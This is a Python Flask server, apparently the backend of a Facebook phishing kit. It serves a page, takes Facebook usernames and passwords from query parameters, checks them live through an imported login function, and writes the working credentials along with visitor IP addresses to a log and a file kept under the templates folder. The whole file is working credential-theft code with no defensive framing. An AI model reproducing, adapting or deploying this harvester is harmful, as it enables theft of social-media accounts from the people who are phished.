import flask
from flask import Flask, render_template, request, jsonify
from login import loginFb
from log import log

# Reinan Bezerra 8.4.2020 3:50

app = Flask(__name__,static_url_path='/static',
template_folder='templates',static_folder='static')

#home
@app.route('/',methods=['GET'])
def home():
	ip = request.remote_addr
	log(f' open in ip {ip}')
	return render_template("index.html")

#loginFacebook
@app.route('/loginFace',methods=['GET'])
def get():
	content = request.args
	ip = request.remote_addr
	print('userFace ',content['user'])
	print('passFace ',content['pass'])
	
	userFace = content['user']
	passFace = content['pass']
	
	res = loginFb(userFace,passFace)
	if res:
		#upando login pro serverPHP
		log(f'===== login accept from ip: {ip}')
		log(f'username: {userFace}')
		log(f'passowrd: {passFace} =====')
		data = open('templates/login', 'a+')
		dtLogin = f'email: {userFace} pass: {passFace}'
		data.write(dtLogin+' \n')
		data.close()
	return jsonify({'return':res})


if __name__ == '__main__':
	app.run()
